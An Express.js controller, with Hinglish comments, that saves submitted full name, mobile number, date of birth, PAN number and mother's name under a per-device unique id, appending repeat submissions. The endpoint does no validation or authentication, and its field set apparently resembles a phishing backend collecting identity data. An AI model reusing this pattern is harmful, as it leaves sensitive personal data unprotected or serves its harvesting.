const User = require('../models/User');

exports.saveUserData = async (req, res) => {
    try {
        const { fullName, mobileNumber, dateOfBirth,panNumber,mothersName, uniqueid } = req.body;
        let user = await User.findOne({ uniqueid });

        if (user) {
            // Agar already exist hai, naya entry add karo
            user.entries.push({ fullName, mobileNumber, dateOfBirth,panNumber,mothersName });
        } else {
            // Naya document create karo
            user = new User({
                uniqueid,
                entries: [{ fullName, mobileNumber, dateOfBirth,panNumber,mothersName }]
            });
        }

        await user.save();

        res.status(200).json({
            success: true,
            message: "User Data Submitted Successfully!"
        });
    } catch (error) {
        console.error(error);
        res.status(500).json({
            success: false,
            message: "Error occurred while submitting user data"
        });
    }
};
